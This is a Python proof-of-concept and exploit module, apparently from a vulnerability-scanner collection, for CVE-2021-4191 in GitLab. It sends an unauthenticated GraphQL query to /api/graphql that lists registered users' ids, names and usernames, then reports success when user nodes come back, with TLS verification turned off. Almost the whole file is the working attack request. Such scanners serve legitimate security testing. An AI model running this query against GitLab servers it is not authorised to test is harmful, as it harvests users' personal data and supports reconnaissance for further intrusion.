import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''GitLab GraphQL API User Enumeration''',
        "description": '''An unauthenticated remote attacker can leverage this vulnerability to collect registered GitLab usernames, names, and email addresses.''',
        "severity": "medium",
        "references": [
            "https://www.rapid7.com/blog/post/2022/03/03/cve-2021-4191-gitlab-graphql-api-user-enumeration-fixed/", 
            "https://thehackernews.com/2022/03/new-security-vulnerability-affects.html", 
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-4191"
        ],
        "classification": {
            "cvss-metrics": "CVSS:5.3/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2021-4191",
            "cwe-id": "CWE-359"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "gitlab", "api", "graphql", "enum", "unauth"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/api/graphql"""
        method = "POST"
        data = {"query":"# Welcome to GraphiQL\n#\n# GraphiQL is an in-browser tool for writing, validating, and\n# testing GraphQL queries.\n#\n# Type queries into this side of the screen, and you will see intelligent\n# typeaheads aware of the current GraphQL type schema and live syntax and\n# validation errors highlighted within the text.\n#\n# GraphQL queries typically start with a \"{\" character. Lines that starts\n# with a # are ignored.\n#\n# An example GraphQL query might look like:\n#\n#     {\n#       field(arg: \"value\") {\n#         subField\n#       }\n#     }\n#\n# Keyboard shortcuts:\n#\n#  Prettify Query:  Shift-Ctrl-P (or press the prettify button above)\n#\n#       Run Query:  Ctrl-Enter (or press the play button above)\n#\n#   Auto Complete:  Ctrl-Space (or just start typing)\n#\n\n{\n  users {\n    nodes {\n      id\n      name\n      username\n    }\n  }\n}","variables":None,"operationName":None}
        headers = {'Content-Type': 'application/json', 'Accept': '*/*'}
        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""data""" in resp0.text and """users""" in resp0.text and """nodes""" in resp0.text and """id""" in resp0.text and """gid://""" in resp0.text) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url